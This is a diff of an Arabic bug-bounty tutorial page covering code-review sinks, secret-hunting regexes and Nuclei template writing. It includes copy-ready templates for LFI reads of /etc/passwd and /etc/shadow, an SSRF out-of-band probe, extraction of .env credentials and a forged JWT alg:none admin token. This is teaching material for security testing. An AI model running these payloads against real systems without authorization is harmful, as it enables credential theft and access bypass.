@@ -9871,15 +9871,51 @@ SMUGGLLED
            MODULE 9: Source Code Review & SAST Playbook
       ═══════════════════════════════════════════════════════════ -->
       <div class="meth-content-view" id="meth-content-code_review" style="display: none; --tool-color: #00e5ff;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🔍</span> Source Code Review & SAST Playbook</h2>
-          <p class="hero-tagline">منهجية الفحص المكتبي للكود (White-Box Audit) واكتشاف الـ Dangerous Sinks باللغات المختلفة</p>
-          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
-            <span class="badge badge-info">ℹ️ Code Auditing</span>
-            <span class="badge badge-tool">🔧 Semgrep · Ripgrep (rg) · SonarQube · Bandit</span>
+        <div class="phase-module-header">
+          <div class="icon-wrapper">🔍</div>
+          <div class="header-text">
+            <h2>Source Code Review & SAST Playbook — الدليل الشامل</h2>
+            <p>منهجية الفحص المكتبي للكود (White-Box Audit) والتحليل الثابت (Static Analysis) لاكتشاف الـ Vulnerable Sinks وسلاسل التتبع (Taint Tracking).</p>
           </div>
         </div>
 
+        <!-- ━━━ TAINT ANALYSIS ━━━ -->
+        <div class="cyber-card" style="border-left:4px solid #00e5ff;">
+          <div class="card-header"><h3>🧬 فلسفة الفحص المكتبي: Taint Analysis (Sources ➔ Sinks)</h3></div>
+          <p>يعتمد مراجع الكود المحترف على تتبع مسار البيانات غير الموثوقة من نقطة ورودها (Source) حتى وصولها لنقطة تنفيذ خطيرة (Sink) دون معالجة وتطهير (Sanitization):</p>
+          
+          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:15px 0;">
+            <div style="background:#0d1117;padding:12px;border-radius:8px;border:1px solid rgba(0,229,255,0.3);">
+              <div style="color:#00e5ff;font-weight:bold;font-size:0.85rem;margin-bottom:6px;">1. Sources (مدخلات المستخدم)</div>
+              <div style="font-family:monospace;font-size:0.78rem;color:#e2e8f0;line-height:1.6;">
+                <div>• req.query / req.body</div>
+                <div>• $_GET / $_POST / $_COOKIE</div>
+                <div>• request.args / request.json</div>
+                <div>• HTTP Headers & Cookies</div>
+              </div>
+            </div>
+            <div style="background:#0d1117;padding:12px;border-radius:8px;border:1px solid rgba(234,179,8,0.3);">
+              <div style="color:#eab308;font-weight:bold;font-size:0.85rem;margin-bottom:6px;">2. Sanitizer (الفلترة والتطهير)</div>
+              <div style="font-family:monospace;font-size:0.78rem;color:#e2e8f0;line-height:1.6;">
+                <div>• Parameterized Queries</div>
+                <div>• HTML Escaping / DOMPurify</div>
+                <div>• Strict Allowlist Filter</div>
+                <div>• Path Normalization (realpath)</div>
+              </div>
+            </div>
+            <div style="background:#0d1117;padding:12px;border-radius:8px;border:1px solid rgba(255,51,102,0.3);">
+              <div style="color:#ff3366;font-weight:bold;font-size:0.85rem;margin-bottom:6px;">3. Sinks (العمليات الخطرة)</div>
+              <div style="font-family:monospace;font-size:0.78rem;color:#e2e8f0;line-height:1.6;">
+                <div>• system() / exec() / eval()</div>
+                <div>• db.query("SELECT..." + input)</div>
+                <div>• include() / fs.readFile()</div>
+                <div>• pickle.loads() / unserialize()</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ━━━ DANGEROUS SINKS MATRIX ━━━ -->
         <div class="cyber-card">
           <div class="card-header"><h3>🎯 جدول الـ Dangerous Sinks بحسب اللغة والبيئة</h3></div>
           <div class="table-wrapper"><table class="interactive-table">
@@ -9890,35 +9926,70 @@ SMUGGLLED
               <tr>
                 <td><strong>Node.js / Express</strong></td>
                 <td>RCE / Command Injection</td>
-                <td><code>eval(req.body.code)</code> / <code>exec(cmd)</code></td>
-                <td><code>execFile(bin, args)</code></td>
+                <td><code>eval(req.body)</code> / <code>child_process.exec(cmd)</code></td>
+                <td><code>execFile(bin, argsArray)</code></td>
               </tr>
               <tr>
                 <td><strong>Node.js / Express</strong></td>
                 <td>DOM XSS / SSRF</td>
                 <td><code>res.send(userInput)</code> / <code>axios.get(url)</code></td>
-                <td>Sanitize + Strict Allowlist</td>
+                <td>DOMPurify + URL Allowlist</td>
               </tr>
               <tr>
                 <td><strong>Python / Flask / Django</strong></td>
                 <td>Insecure Deserialization / RCE</td>
-                <td><code>pickle.loads(user_data)</code> / <code>yaml.load()</code></td>
+                <td><code>pickle.loads(data)</code> / <code>yaml.load(input)</code></td>
                 <td><code>json.loads()</code> / <code>yaml.safe_load()</code></td>
               </tr>
               <tr>
                 <td><strong>PHP</strong></td>
                 <td>LFI / Unserialize RCE</td>
-                <td><code>include($_GET['p'])</code> / <code>unserialize()</code></td>
-                <td>Hardcoded file map / JSON</td>
+                <td><code>include($_GET['p'])</code> / <code>unserialize($cookie)</code></td>
+                <td>Strict array mapping / JSON parse</td>
               </tr>
               <tr>
                 <td><strong>Java / Spring Boot</strong></td>
                 <td>SQL Injection / RCE</td>
-                <td><code>stmt.executeQuery("..." + input)</code></td>
+                <td><code>stmt.executeQuery("..." + input)</code> / <code>Runtime.exec()</code></td>
                 <td><code>PreparedStatement</code> (Parameterized)</td>
+              </tr>
+              <tr>
+                <td><strong>Go (Golang)</strong></td>
+                <td>Command Injection / SSTI</td>
+                <td><code>exec.Command("sh", "-c", input)</code> / <code>template.HTML()</code></td>
+                <td>Pass args array to <code>exec.Command</code></td>
               </tr>
             </tbody>
           </table></div>
+        </div>
+
+        <!-- ━━━ SEMGREP & RIPGREP ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚡ أدوات SAST السريعة: Semgrep & Ripgrep (rg)</h3></div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #00e5ff;">
+              <div style="color:#00e5ff;font-weight:bold;margin-bottom:6px;">1. تشغيل Semgrep قواعد جاهزة</div>
+              <div style="font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.8;">
+                <div style="color:#94a3b8;"># فحص مشروع Node.js كامل</div>
+                <div>semgrep --config p/nodejs /path/to/code</div>
+                <div style="color:#94a3b8;margin-top:4px;"># فحص ثغرات OWASP Top 10 في Python</div>
+                <div>semgrep --config p/owasp-top-10 /path/to/django</div>
+                <div style="color:#94a3b8;margin-top:4px;"># فحص أمني مخصص بلغة Java</div>
+                <div>semgrep --config p/java /path/to/spring</div>
+              </div>
+            </div>
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #00ff66;">
+              <div style="color:#00ff66;font-weight:bold;margin-bottom:6px;">2. صيد المفاتيح والـ Secrets بـ Ripgrep</div>
+              <div style="font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.8;">
+                <div style="color:#94a3b8;"># البحث عن AWS Access Keys</div>
+                <div>rg -i "AKIA[0-9A-Z]{16}" .</div>
+                <div style="color:#94a3b8;margin-top:4px;"># البحث عن JWT Tokens مشفرة</div>
+                <div>rg -i "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+" .</div>
+                <div style="color:#94a3b8;margin-top:4px;"># البحث عن كلمات سر وتوكنات خردة</div>
+                <div>rg -i "(api_key|secret|password|bearer)\s*[:=]" .</div>
+              </div>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
@@ -9937,6 +10008,7 @@ SMUGGLLED
           </div>
         </div>
       </div>
+
 
 
       <!-- ═══════════════════════════════════════════════════════════
@@ -10071,14 +10143,266 @@ SMUGGLLED
            MODULE 14: Nuclei Custom Template Generator
       ═══════════════════════════════════════════════════════════ -->
       <div class="meth-content-view" id="meth-content-nuclei_builder" style="display: none; --tool-color: #00ff66;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">⚙️</span> Nuclei Custom Template Generator</h2>
-          <p class="hero-tagline">إنشاء قوالب YAML مخصصة لأداة Nuclei بضغطة زر وتنزيلها مباشرة</p>
-          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
-            <span class="badge badge-info">ℹ️ Template Builder</span>
-            <span class="badge badge-tool">🔧 Nuclei v3 YAML Generator</span>
+        <div class="phase-module-header">
+          <div class="icon-wrapper">⚙️</div>
+          <div class="header-text">
+            <h2>Nuclei — الدليل الشامل لكتابة القوالب المخصصة</h2>
+            <p>Nuclei هو أسرع scanner مفتوح المصدر في Bug Bounty. هنا ستفهم بنية الـ YAML من الصفر وتكتب قوالبك الخاصة لأي ثغرة.</p>
           </div>
         </div>
+
+        <!-- ━━━ WHY NUCLEI ━━━ -->
+        <div class="cyber-card" style="border-left:4px solid #00ff66;">
+          <div class="card-header"><h3>🚀 لماذا Nuclei هو السلاح الأساسي في Bug Bounty؟</h3></div>
+          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:12px 0;">
+            <div style="background:#0d1117;padding:12px;border-radius:8px;text-align:center;">
+              <div style="font-size:1.5rem;margin-bottom:5px;">⚡</div>
+              <div style="color:#00ff66;font-weight:bold;font-size:0.85rem;">سرعة فائقة</div>
+              <div style="color:#94a3b8;font-size:0.8rem;margin-top:4px;">يفحص آلاف الـ endpoints في دقائق بـ HTTP/2 وConcurrency</div>
+            </div>
+            <div style="background:#0d1117;padding:12px;border-radius:8px;text-align:center;">
+              <div style="font-size:1.5rem;margin-bottom:5px;">📦</div>
+              <div style="color:#00ff66;font-weight:bold;font-size:0.85rem;">9000+ قالب جاهز</div>
+              <div style="color:#94a3b8;font-size:0.8rem;margin-top:4px;">مجتمع ضخم يحدّث قوالب CVEs والثغرات يومياً</div>
+            </div>
+            <div style="background:#0d1117;padding:12px;border-radius:8px;text-align:center;">
+              <div style="font-size:1.5rem;margin-bottom:5px;">🎯</div>
+              <div style="color:#00ff66;font-weight:bold;font-size:0.85rem;">False Positives منخفضة</div>
+              <div style="color:#94a3b8;font-size:0.8rem;margin-top:4px;">Matchers دقيقة تضمن نتائج موثوقة وليس ضجيج</div>
+            </div>
+          </div>
+          <div style="background:#090d16;padding:12px;border-radius:6px;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+            <div style="color:#94a3b8;"># تثبيت Nuclei</div>
+            <div>go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</div>
+            <div style="color:#94a3b8;margin-top:6px;"># تحديث القوالب</div>
+            <div>nuclei -update-templates</div>
+            <div style="color:#94a3b8;margin-top:6px;"># فحص هدف مع كل القوالب</div>
+            <div>nuclei -u https://target.com -t /root/nuclei-templates/ -o output.txt</div>
+            <div style="color:#94a3b8;margin-top:6px;"># فحص قائمة أهداف بـ severity معينة</div>
+            <div>nuclei -l targets.txt -severity critical,high -o critical_findings.txt</div>
+          </div>
+        </div>
+
+        <!-- ━━━ YAML ANATOMY ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>📐 تشريح الـ YAML Template — بنية كاملة مشروحة</h3></div>
+
+          <div style="background:#050a14;padding:18px;border-radius:8px;border:1px solid rgba(0,255,102,0.2);font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.9;">
+            <div style="color:#a855f7;">id</div><div style="padding-left:16px;"><span style="color:#00e5ff;">custom-lfi-checker</span> <span style="color:#475569;"># ← اسم فريد للقالب (kebab-case)</span></div>
+            <div style="margin-top:8px;color:#a855f7;">info</div>
+            <div style="padding-left:16px;"><span style="color:#f97316;">name</span>: <span style="color:#e2e8f0;">LFI via Page Parameter</span></div>
+            <div style="padding-left:16px;"><span style="color:#f97316;">author</span>: <span style="color:#e2e8f0;">abdo453</span></div>
+            <div style="padding-left:16px;"><span style="color:#f97316;">severity</span>: <span style="color:#ff3366;">critical</span> <span style="color:#475569;"># ← critical / high / medium / low / info</span></div>
+            <div style="padding-left:16px;"><span style="color:#f97316;">description</span>: <span style="color:#e2e8f0;">Detects Local File Inclusion via the ?page parameter</span></div>
+            <div style="padding-left:16px;"><span style="color:#f97316;">tags</span>: <span style="color:#e2e8f0;">lfi,file-inclusion,php</span></div>
+            <div style="margin-top:10px;color:#a855f7;">http</div>
+            <div style="padding-left:16px;"><span style="color:#f97316;">- method</span>: <span style="color:#e2e8f0;">GET</span></div>
+            <div style="padding-left:28px;color:#94a3b8;"># path: URLs to test — {{BaseURL}} = target URL تلقائياً</div>
+            <div style="padding-left:28px;"><span style="color:#f97316;">path</span>:</div>
+            <div style="padding-left:40px;"><span style="color:#00e5ff;">- "{{BaseURL}}/view.php?page=../../../../etc/passwd"</span></div>
+            <div style="padding-left:40px;"><span style="color:#00e5ff;">- "{{BaseURL}}/index.php?file=../../../etc/shadow"</span></div>
+            <div style="margin-top:8px;padding-left:28px;color:#94a3b8;"># matchers: شروط لتحديد وجود الثغرة في الـ Response</div>
+            <div style="padding-left:28px;"><span style="color:#f97316;">matchers-condition</span>: <span style="color:#e2e8f0;">and</span> <span style="color:#475569;"># ← and / or</span></div>
+            <div style="padding-left:28px;"><span style="color:#f97316;">matchers</span>:</div>
+            <div style="padding-left:40px;"><span style="color:#00e5ff;">- type</span>: <span style="color:#eab308;">word</span> <span style="color:#475569;"># ← word / regex / status / size / binary / dsl</span></div>
+            <div style="padding-left:52px;"><span style="color:#f97316;">words</span>:</div>
+            <div style="padding-left:64px;"><span style="color:#00e5ff;">- "root:x:0:0:"</span> <span style="color:#475569;"># ← نص نبحث عنه في الـ Response</span></div>
+            <div style="padding-left:64px;"><span style="color:#00e5ff;">- "/bin/bash"</span></div>
+            <div style="padding-left:52px;"><span style="color:#f97316;">condition</span>: <span style="color:#e2e8f0;">or</span></div>
+            <div style="padding-left:40px;"><span style="color:#00e5ff;">- type</span>: <span style="color:#eab308;">status</span></div>
+            <div style="padding-left:52px;"><span style="color:#f97316;">status</span>: <span style="color:#e2e8f0;">[200]</span></div>
+          </div>
+        </div>
+
+        <!-- ━━━ MATCHER TYPES ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>🎯 أنواع الـ Matchers — كيف تكتشف الثغرة</h3></div>
+          <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:0.82rem;">
+              <thead>
+                <tr style="background:#0d1117;border-bottom:2px solid #00ff66;">
+                  <th style="padding:10px;text-align:left;color:#00ff66;">النوع</th>
+                  <th style="padding:10px;text-align:left;color:#00ff66;">الوصف</th>
+                  <th style="padding:10px;text-align:left;color:#00ff66;">مثال</th>
+                  <th style="padding:10px;text-align:left;color:#00ff66;">الاستخدام</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><code style="color:#eab308;">word</code></td>
+                  <td style="padding:8px;color:#e2e8f0;">يبحث عن كلمة/جملة في الـ response</td>
+                  <td style="padding:8px;font-family:monospace;font-size:0.78rem;color:#00e5ff;">words: ["root:x:0:0"]</td>
+                  <td style="padding:8px;color:#94a3b8;">LFI, SQLi, Disclosure</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><code style="color:#eab308;">regex</code></td>
+                  <td style="padding:8px;color:#e2e8f0;">يبحث بـ Regular Expression</td>
+                  <td style="padding:8px;font-family:monospace;font-size:0.78rem;color:#00e5ff;">regex: ["root:[x*]:0:0"]</td>
+                  <td style="padding:8px;color:#94a3b8;">Patterns غير محددة</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><code style="color:#eab308;">status</code></td>
+                  <td style="padding:8px;color:#e2e8f0;">يتحقق من كود HTTP</td>
+                  <td style="padding:8px;font-family:monospace;font-size:0.78rem;color:#00e5ff;">status: [200, 301]</td>
+                  <td style="padding:8px;color:#94a3b8;">فحص وجود endpoint</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><code style="color:#eab308;">binary</code></td>
+                  <td style="padding:8px;color:#e2e8f0;">يبحث عن bytes ثنائية</td>
+                  <td style="padding:8px;font-family:monospace;font-size:0.78rem;color:#00e5ff;">binary: ["504b0304"]</td>
+                  <td style="padding:8px;color:#94a3b8;">ملفات ZIP/EXE</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><code style="color:#eab308;">size</code></td>
+                  <td style="padding:8px;color:#e2e8f0;">يقارن حجم الـ response</td>
+                  <td style="padding:8px;font-family:monospace;font-size:0.78rem;color:#00e5ff;">size: [1337]</td>
+                  <td style="padding:8px;color:#94a3b8;">Timing/Blind attacks</td>
+                </tr>
+                <tr>
+                  <td style="padding:8px;"><code style="color:#eab308;">dsl</code></td>
+                  <td style="padding:8px;color:#e2e8f0;">لوجيك معقدة بـ expression language</td>
+                  <td style="padding:8px;font-family:monospace;font-size:0.78rem;color:#00e5ff;">dsl: ["len(body) > 500 && status_code == 200"]</td>
+                  <td style="padding:8px;color:#94a3b8;">Conditions مركّبة</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- ━━━ REAL TEMPLATES ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>🔥 قوالب حقيقية جاهزة — Copy & Use</h3></div>
+
+          <div style="margin-bottom:20px;">
+            <div style="color:#ff3366;font-weight:bold;margin-bottom:8px;">📋 Template 1: SSRF via PDF Generator</div>
+            <div style="background:#050a14;padding:14px;border-radius:6px;border-left:3px solid #ff3366;font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.9;">
+              <div>id: <span style="color:#00e5ff;">ssrf-pdf-generator</span></div>
+              <div>info:</div>
+              <div>&nbsp;&nbsp;name: <span style="color:#e2e8f0;">SSRF via PDF URL Parameter</span></div>
+              <div>&nbsp;&nbsp;severity: <span style="color:#ff3366;">critical</span></div>
+              <div>&nbsp;&nbsp;tags: <span style="color:#e2e8f0;">ssrf,pdf,oast</span></div>
+              <div>http:</div>
+              <div>&nbsp;&nbsp;- method: POST</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;path:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- "<span style="color:#00e5ff;">{{BaseURL}}/api/pdf/generate</span>"</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;body: <span style="color:#eab308;">'{"url":"https://{{interactsh-url}}/ssrf-test"}'</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;headers:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Content-Type: <span style="color:#e2e8f0;">application/json</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;matchers:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- type: <span style="color:#eab308;">word</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;part: <span style="color:#e2e8f0;">interactsh_protocol</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;words: [<span style="color:#00e5ff;">"http"</span>] <span style="color:#475569;"># يكتشف إذا الـ server طلب الـ URL (OOB)</span></div>
+            </div>
+          </div>
+
+          <div style="margin-bottom:20px;">
+            <div style="color:#a855f7;font-weight:bold;margin-bottom:8px;">📋 Template 2: Exposed .env File</div>
+            <div style="background:#050a14;padding:14px;border-radius:6px;border-left:3px solid #a855f7;font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.9;">
+              <div>id: <span style="color:#00e5ff;">exposed-env-file</span></div>
+              <div>info:</div>
+              <div>&nbsp;&nbsp;name: <span style="color:#e2e8f0;">Exposed .env Configuration File</span></div>
+              <div>&nbsp;&nbsp;severity: <span style="color:#ff9a56;">high</span></div>
+              <div>&nbsp;&nbsp;tags: <span style="color:#e2e8f0;">exposure,config,laravel</span></div>
+              <div>http:</div>
+              <div>&nbsp;&nbsp;- method: GET</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;path:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- "<span style="color:#00e5ff;">{{BaseURL}}/.env</span>"</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- "<span style="color:#00e5ff;">{{BaseURL}}/.env.backup</span>"</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- "<span style="color:#00e5ff;">{{BaseURL}}/.env.production</span>"</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;matchers-condition: and</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;matchers:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- type: <span style="color:#eab308;">word</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;words: [<span style="color:#00e5ff;">"DB_PASSWORD"</span>, <span style="color:#00e5ff;">"APP_KEY"</span>, <span style="color:#00e5ff;">"DB_HOST"</span>]</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;condition: or</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- type: <span style="color:#eab308;">status</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status: [<span style="color:#00e5ff;">200</span>]</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;extractors: <span style="color:#475569;"># ← يسحب القيم من الـ response مباشرة!</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- type: <span style="color:#eab308;">regex</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;regex:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- <span style="color:#00e5ff;">"(?m)^(DB_|APP_|AWS_)[A-Z_]+=.+"</span></div>
+            </div>
+          </div>
+
+          <div>
+            <div style="color:#00e5ff;font-weight:bold;margin-bottom:8px;">📋 Template 3: JWT Algorithm Confusion (alg:none)</div>
+            <div style="background:#050a14;padding:14px;border-radius:6px;border-left:3px solid #00e5ff;font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.9;">
+              <div>id: <span style="color:#00e5ff;">jwt-alg-none</span></div>
+              <div>info:</div>
+              <div>&nbsp;&nbsp;name: <span style="color:#e2e8f0;">JWT Algorithm None Bypass</span></div>
+              <div>&nbsp;&nbsp;severity: <span style="color:#ff3366;">critical</span></div>
+              <div>&nbsp;&nbsp;tags: <span style="color:#e2e8f0;">jwt,auth,bypass</span></div>
+              <div>http:</div>
+              <div>&nbsp;&nbsp;- method: GET</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;path:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- "<span style="color:#00e5ff;">{{BaseURL}}/api/admin/users</span>"</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;headers:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#475569;"># JWT with alg:none (no signature needed!)</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Authorization: <span style="color:#eab308;">Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;matchers:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- type: <span style="color:#eab308;">dsl</span></div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dsl:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- <span style="color:#00e5ff;">'status_code == 200 && contains(body, "admin")'</span></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ━━━ RUN COMMANDS ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚡ أوامر تشغيل Nuclei المتقدمة</h3></div>
+          <div style="display:grid;grid-template-columns:1fr;gap:10px;">
+            <div style="background:#090d16;padding:12px;border-radius:6px;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.9;">
+              <div style="color:#94a3b8;"># فحص بـ قالب محدد</div>
+              <div>nuclei -u https://target.com -t my-template.yaml -v</div>
+              <div style="color:#94a3b8;margin-top:6px;"># فحص قائمة أهداف بـ category كاملة</div>
+              <div>nuclei -l targets.txt -t cves/ -t exposures/ -c 50 -o results.txt</div>
+              <div style="color:#94a3b8;margin-top:6px;"># فحص مع تجاهل False Positives (Interactsh)</div>
+              <div>nuclei -u https://target.com -t ssrf/ -iserver https://oast.pro</div>
+              <div style="color:#94a3b8;margin-top:6px;"># استخدام Headers مخصصة (لـ Authenticated Targets)</div>
+              <div>nuclei -u https://target.com -H "Authorization: Bearer TOKEN" -t authenticated/</div>
+              <div style="color:#94a3b8;margin-top:6px;"># فحص محدد بـ Tags</div>
+              <div>nuclei -u https://target.com -tags "xss,sqli,lfi,ssrf" -severity critical,high</div>
+              <div style="color:#94a3b8;margin-top:6px;"># تصدير النتائج بـ JSON لـ Reporting</div>
+              <div>nuclei -l targets.txt -j -o output.json -stats</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- INTERACTIVE GENERATOR -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ Custom YAML Generator — أنشئ قالبك بضغطة زر</h3></div>
+          <div style="background:rgba(0,255,102,0.05); padding:15px; border-radius:8px; border:1px solid rgba(0,255,102,0.2);">
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:10px;">
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Template ID:</label>
+                <input type="text" id="nuc-id" value="custom-cve-check" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+              </div>
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Severity:</label>
+                <select id="nuc-sev" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+                  <option value="critical">Critical</option>
+                  <option value="high">High</option>
+                  <option value="medium">Medium</option>
+                  <option value="low">Low</option>
+                  <option value="info">Info</option>
+                </select>
+              </div>
+            </div>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:10px;">
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Request Path:</label>
+                <input type="text" id="nuc-path" value="/api/v1/debug" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+              </div>
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Match Word / String:</label>
+                <input type="text" id="nuc-match" value="root:x:0:0" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+              </div>
+            </div>
+            <button class="cmd-btn" onclick="generateNucleiYaml()" style="background:#00ff66; color:#000; border:none; padding:8px 16px; border-radius:4px; font-weight:bold; cursor:pointer; margin-bottom:15px;">⚡ Build YAML Template</button>
+            <textarea id="nuc-yaml-out" style="width:100%; height:200px; background:#040914; color:#e2e8f0; font-family:monospace; padding:10px; border:1px solid #00ff66; border-radius:4px;"></textarea>
+            <button onclick="copyNucleiYaml()" style="margin-top:8px; background:var(--accent-cyan); color:#000; border:none; padding:6px 14px; border-radius:4px; font-weight:bold; cursor:pointer;">📋 Copy YAML</button>
+          </div>
+        </div>
+      </div>
 
         <div class="cyber-card">
           <div class="card-header"><h3>🛠️ Custom YAML Generator</h3></div>
@@ -10852,53 +11176,225 @@ rg -i "AIzaSy[A-Za-z0-9_-]{33}" out_dir/</code></pre>
            MODULE: Instant Bash One-Liners Matrix
       ═══════════════════════════════════════════════════════════ -->
       <div class="meth-content-view" id="meth-content-oneliners_matrix" style="display: none; --tool-color: #f97316;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">⚡</span> Instant Bash One-Liners Arsenal</h2>
-          <p class="hero-tagline">أقوى أوامر الـ Bash والـ Pipelining الجاهزة للنسخ الفوري</p>
+        <div class="phase-module-header">
+          <div class="icon-wrapper">⚡</div>
+          <div class="header-text">
+            <h2>Instant Bash One-Liners Arsenal — مصفوفة أوامر الصيد السريع</h2>
+            <p>سلاسل أوامر Bash وPipelining احترافية مع أزرار نسخ فورية لمختلف مراحل Recon والصيد الميداني.</p>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📋 مصفوفة الأوامر السريعة</h3></div>
+          <div class="card-header"><h3>📋 مصفوفة الأوامر السريعة (10 Pro Pipelines)</h3></div>
           
-          <div style="display:flex; flex-direction:column; gap:10px;">
-            <div style="background:#090d16; padding:10px; border-radius:6px; border-left:3px solid #00e5ff;">
-              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
-                <span style="color:#00e5ff; font-weight:bold; font-size:0.85rem;">1. Full Subdomain Enum & Alive Filter:</span>
-                <button onclick="copyOneLiner(this)" data-cmd="subfinder -d target.com -all -silent | httpx -silent -sc -title -td -o alive_subs.txt" style="background:#00e5ff; color:#000; border:none; padding:2px 6px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.7rem;">Copy</button>
+          <div style="display:flex; flex-direction:column; gap:12px;">
+            <!-- 1 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #00e5ff;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#00e5ff; font-weight:bold; font-size:0.85rem;">1. Subdomain Discovery & Live Probing Pipeline</span>
